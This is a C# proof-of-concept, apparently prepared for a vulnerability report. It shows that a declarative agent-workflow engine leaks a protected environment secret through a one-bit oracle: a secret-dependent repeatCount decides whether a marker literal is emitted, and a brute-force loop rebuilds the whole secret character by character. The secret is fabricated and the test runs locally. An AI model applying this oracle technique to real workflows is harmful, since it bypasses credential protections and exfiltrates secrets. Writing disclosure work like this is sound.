// QuestionExecutor sensitivity-boundary oracle probe — sibling of MSRC Case 159229 (ConditionGroup).
// Authorized MSRC OSS bounty research. All data fabricated, fully local, no network.
// Channel under test: QuestionExecutor reads RepeatCount (line 162) and AlwaysPrompt (line 52)
// via Evaluator.GetValue(...).Value WITHOUT GetNonSensitiveValue/ThrowIfSensitive, so a predicate
// over a protected Env value steers whether a literal MessageActivityEvent is emitted = a 1-bit oracle.
using System.Runtime.CompilerServices;
using Microsoft.Agents.AI;
using Microsoft.Agents.AI.Workflows;
using Microsoft.Agents.AI.Workflows.Declarative;
using Microsoft.Agents.AI.Workflows.Declarative.Events;
using Microsoft.Extensions.AI;

Environment.SetEnvironmentVariable("API_SECRET", "sk_live_SECRETBIT");

const string Head = "kind: Workflow\ntrigger:\n  kind: OnConversationStart\n  id: w\n  actions:\n";

// Control (expect BLOCK): directly emit the secret via a sink -> GHSA-9f26 guard must fire.
string controlYaml = Head +
  "    - kind: SendActivity\n      id: a\n      activity: \"OUT={Env.API_SECRET}\"\n";

// Build a Question-oracle workflow: repeatCount = If(<predicate over secret>, 0, 9).
// predicate TRUE  -> repeatCount 0 -> PromptAsync(0): 0>=0 -> emits DefaultValueResponse literal (HIT).
// predicate FALSE -> repeatCount 9 -> 0>=9 false -> external-input branch (no HIT literal emitted).
static string QOracle(string predicate) => Head +
  "    - kind: Question\n      id: q\n      variable: Local.Answer\n      alwaysPrompt: true\n" +
  $"      repeatCount: =If({predicate}, 0, 9)\n" +
  "      prompt: ignored\n" +
  "      defaultValue: =\"d\"\n" +
  "      defaultValueResponse: QORACLE_HIT\n" +
  "      entity:\n        kind: StringPrebuiltEntity\n";

async Task<(string outcome, string? emitted, string? error)> Run(string yaml)
{
    var opts = new DeclarativeWorkflowOptions(new StubProvider())
    {
        AllowedEnvironmentVariables = new[] { "API_SECRET" },
        AllowProcessEnvironmentVariableFallback = true,
    };
    string? emitted = null; string? error = null;
    using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10)); // test-only: stop an input-wait, not a finding cap
    try
    {
        using var reader = new StringReader(yaml);
        var wf = DeclarativeWorkflowBuilder.Build<string>(reader, opts);
        await using var run = await InProcessExecution.RunStreamingAsync(wf, "go");
        await foreach (var ev in run.WatchStreamAsync(cts.Token))
        {
            if (ev is MessageActivityEvent m && m.Message is not null) emitted = m.Message.Trim();
            if (ev is WorkflowErrorEvent e)
            {
                var ex = e.Data as Exception; var sb = new System.Text.StringBuilder();
                for (var x = ex; x != null; x = x.InnerException) sb.Append(x.GetType().Name + ": " + x.Message + " || ");
                error = sb.ToString(); break;
            }
            if (ev is RequestInfoEvent) break; // external input requested = predicate-false branch; terminate observation
        }
    }
    catch (OperationCanceledException) { /* input-wait branch */ }
    catch (Exception ex) { error = ex.Message; }
    return (error is not null ? "BLOCKED" : "OK", emitted, error);
}

Console.WriteLine("== CONTROL: direct secret to sink (expect BLOCKED) ==");
var c = await Run(controlYaml);
Console.WriteLine($"  outcome={c.outcome} emitted={c.emitted ?? "<none>"} err={(c.error ?? "")}");

Console.WriteLine("\n== ORACLE validity: emitted literal tracks a secret-dependent predicate (secret never emitted) ==");
foreach (var (label, pred) in new[] {
    ("StartsWith(secret,\"sk_live\")  [TRUE]", "StartsWith(Env.API_SECRET, \"sk_live\")"),
    ("StartsWith(secret,\"xx\")       [FALSE]", "StartsWith(Env.API_SECRET, \"xx\")"),
})
{
    var r = await Run(QOracle(pred));
    bool hit = r.emitted == "QORACLE_HIT";
    Console.WriteLine($"  predicate {label} -> emitted={r.emitted ?? "<none>"}  => oracle bit = {(hit ? "1" : "0")}");
}

Console.WriteLine("\n== FULL SECRET RECOVERY via =Mid(Env.API_SECRET,i,1)=\"c\" oracle (secret never emitted) ==");
const string Charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-";
var recovered = new System.Text.StringBuilder();
for (int i = 1; i <= 40; i++)
{
    char? found = null;
    foreach (char ch in Charset)
    {
        var r = await Run(QOracle($"Mid(Env.API_SECRET, {i}, 1) = \"{ch}\""));
        if (r.emitted == "QORACLE_HIT") { found = ch; break; }
    }
    if (found is null) break; // past end of secret: no charset char matched position i
    recovered.Append(found.Value);
}
string actual = Environment.GetEnvironmentVariable("API_SECRET")!;
Console.WriteLine($"  recovered = \"{recovered}\"");
Console.WriteLine($"  actual    = \"{actual}\"");
Console.WriteLine($"  match     = {recovered.ToString() == actual}");

sealed class StubProvider : ResponseAgentProvider
{
    public override Task<string> CreateConversationAsync(CancellationToken ct = default) => Task.FromResult("conv-1");
    public override Task<ChatMessage> CreateMessageAsync(string c, ChatMessage m, CancellationToken ct = default) => Task.FromResult(m);
    public override Task<ChatMessage> GetMessageAsync(string c, string id, CancellationToken ct = default) => Task.FromResult(new ChatMessage(ChatRole.User, string.Empty));
    public override async IAsyncEnumerable<AgentResponseUpdate> InvokeAgentAsync(string a, string? v, string? c, IEnumerable<ChatMessage>? m, IDictionary<string, object?>? i, [EnumeratorCancellation] CancellationToken ct = default) { yield break; await Task.CompletedTask; }
    public override async IAsyncEnumerable<ChatMessage> GetMessagesAsync(string c, int? l = null, string? a = null, string? b = null, bool n = false, [EnumeratorCancellation] CancellationToken ct = default) { yield break; await Task.CompletedTask; }
}
